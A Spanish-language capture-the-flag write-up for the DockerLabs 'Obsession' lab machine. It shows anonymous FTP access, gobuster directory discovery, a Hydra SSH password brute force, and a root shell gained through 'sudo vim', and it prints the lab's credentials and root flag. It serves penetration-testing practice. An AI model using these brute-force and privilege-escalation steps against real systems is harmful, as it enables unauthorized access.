# 💬 Obsession - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/Técnicas-FTP%20an%C3%B3nimo%20%7C%20Hydra%20%7C%20GTFObins-orange)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota:

- Login anónimo en FTP con pistas en archivos de texto.
- Enumeración web con Gobuster para descubrir rutas ocultas.
- Fuerza bruta SSH con Hydra y `rockyou.txt`.
- Mala configuración de `sudo` con Vim para escalar a root.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | 21, 22, 80 |
| Enumeración | FTP anónimo | usuarios y pistas |
| Enumeración web | `gobuster` | `/backup/`, `/important/` |
| Explotación | `hydra` SSH | russoski:iloveme |
| Escalada | `sudo vim` | **root** |

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --min-rate 5000 -T4 -v 172.17.0.2
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21     | FTP      | vsftpd 3.0.5 |
| 22     | SSH      | OpenSSH 9.6p1 |
| 80     | HTTP     | Apache httpd 2.4.58 |

---

## 🔎 Enumeración

### 1. FTP anónimo

El servicio FTP permite login anónimo. Se descargan los archivos disponibles:

```bash
ftp 172.17.0.2
# Usuario: anonymous
# Password: (enter)

ftp> ls
ftp> get chat-gonza.txt
ftp> get pendientes.txt
ftp> bye
```

**Hallazgos:**

- Pistas sobre el usuario `russoski`.

### 2. Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Directorios encontrados:**

- `/backup/`
- `/important/`

Dentro de `/backup/` se encuentra `backup.txt` con la pista:

```
Para todos mis servicios: russoski (cambiar pronto!)
```

💡 **Hallazgo:** usuario `russoski`, contraseña débil pendiente de cambio.

---

## 💥 Explotación

### 1. Fuerza bruta SSH

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

**Credenciales obtenidas:**

```
russoski:iloveme
```

### 2. Acceso SSH

```bash
ssh russoski@172.17.0.2
# password: iloveme
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

---

## 🚀 Escalada de privilegios

### 1. Enumeración de sudo

```bash
sudo -l
```

**Salida:**

```
User russoski may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar **Vim** como root sin contraseña.

### 2. Exploit con GTFObins

Consultando [GTFObins - vim](https://gtfobins.github.io/gtfobins/vim/):

```bash
sudo vim -c ':!/bin/sh'
```

Comprobación:

```bash
whoami
# root
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| `root.txt` | `aac0a9daa4185875786c9ed154f0dece` |
| Usuario | `russoski` |
| Contraseña | `iloveme` |

---

## 📸 Evidencia

![root](https://github.com/user-attachments/assets/6957f247-0544-4a6d-b7fd-ac2c22c8e58c)

✅ **Máquina comprometida completamente.**

---

## 🧠 Lecciones aprendidas

1. **FTP anónimo sigue existiendo** y es una fuente clásica de pistas.
2. **`gobuster` es útil** cuando el sitio tiene directorios con contenido (a diferencia de Vacaciones).
3. **`rockyou.txt` completo** aquí sí vale la pena cuando sospechas contraseñas comunes.
4. **`sudo -l` es lo primero** tras obtener shell.
5. **Vim con sudo es un GTFObins clásico**: `sudo vim -c ':!/bin/sh'`.
6. **Anotar credenciales y flags** al final del writeup facilita repasar.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `ftp`
- `gobuster`
- `hydra`
- SSH
- GTFObins

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [GTFObins - vim](https://gtfobins.github.io/gtfobins/vim/)
- [HackTricks](https://book.hacktricks.xyz/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-20
